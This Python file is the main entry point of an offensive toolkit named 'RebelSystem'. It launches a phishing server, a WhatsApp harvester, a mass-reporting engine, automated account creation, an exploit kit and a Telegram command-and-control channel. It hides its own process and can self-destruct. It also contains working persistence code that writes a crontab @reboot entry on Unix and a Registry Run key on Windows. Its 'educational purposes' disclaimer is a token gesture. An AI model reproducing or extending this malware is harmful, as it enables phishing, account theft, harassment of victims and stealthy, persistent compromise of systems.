#!/usr/bin/env python3
import os
import sys
import time
import logging
import threading
import subprocess
from config import Config
from database import RebelDatabase
from proxy_manager import ProxyManager
from phishing_server import PhishingServer
from reporting_engine import ReportingEngine
from whatsapp_harvester import WhatsAppHarvester
from account_creator import AccountCreator
from telegram_controller import TelegramController
from exploit_kit import ExploitKit
from utils import self_destruct, check_root, hide_process

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger('Main')

class RebelSystem:
    def __init__(self):
        self.config = Config()
        self.db = RebelDatabase(self.config.DB_FILE, self.config.ENCRYPTION_KEY)
        self.proxy_manager = ProxyManager(self.config.PROXY_LIST, use_tor=self.config.USE_TOR)
        self.phishing_server = PhishingServer(self.config)
        self.phishing_server.set_db(self.db)  # Inject db reference
        self.reporting_engine = ReportingEngine(self.db, self.proxy_manager, self.config)
        self.whatsapp_harvester = WhatsAppHarvester(self.db, self.proxy_manager, self.config)
        self.account_creator = AccountCreator(self.proxy_manager, self.config)
        self.exploit_kit = ExploitKit(self.config)
        self.telegram_controller = TelegramController(self.config.TELEGRAM_BOT_TOKEN, 
                                                       self.reporting_engine, 
                                                       self.whatsapp_harvester,
                                                       self.account_creator,
                                                       self.db)
        self.running = True
        self.threads = []

    def start(self):
        hide_process()
        if os.name == 'posix' and self.config.REQUIRE_ROOT:
            check_root()

        logger.info("🔥 REBEL SYSTEM INITIALIZING – PREPARE FOR DIGITAL WARFARE")

        t1 = threading.Thread(target=self.phishing_server.run, daemon=True)
        t1.start()
        self.threads.append(t1)

        self.reporting_engine.start_workers()
        logger.info(f"Reporting engine active with {self.config.MAX_THREADS} threads")

        self.whatsapp_harvester.start()
        logger.info("WhatsApp harvester active")

        if self.config.TELEGRAM_BOT_TOKEN:
            t2 = threading.Thread(target=self.telegram_controller.start, daemon=True)
            t2.start()
            logger.info("Telegram C2 channel established")

        self.exploit_kit.start_background_tasks()

        if self.config.ENABLE_PERSISTENCE:
            self._setup_persistence()

        logger.info("SYSTEM FULLY OPERATIONAL. AWAITING TARGETS.")
        logger.warning("This software is for educational purposes. Unauthorized use is illegal and unethical.")
        logger.warning("You alone are responsible for your actions.")

        try:
            while self.running:
                time.sleep(60)
        except KeyboardInterrupt:
            logger.info("Shutdown signal received.")
            self.shutdown()

    def _setup_persistence(self):
        if os.name == 'posix':
            cron_line = f"@reboot cd {os.getcwd()} && python3 main.py > /dev/null 2>&1 &"
            with open("/tmp/cron_tmp", "w") as f:
                f.write(cron_line + "\n")
            subprocess.run("crontab /tmp/cron_tmp", shell=True)
            os.remove("/tmp/cron_tmp")
            logger.info("Persistence via crontab established.")
        elif os.name == 'nt':
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                  r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                  0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "RebelSystem", 0, winreg.REG_SZ, 
                              f"python {os.path.abspath(__file__)}")
            winreg.CloseKey(key)
            logger.info("Persistence via registry established.")

    def shutdown(self):
        logger.info("Shutting down...")
        self.running = False
        self.reporting_engine.stop()
        self.whatsapp_harvester.stop()
        self.exploit_kit.stop()
        self.db.close()
        if self.config.SELF_DESTRUCT_ON_EXIT:
            self_destruct()
        sys.exit(0)

if __name__ == '__main__':
    system = RebelSystem()
    system.start()
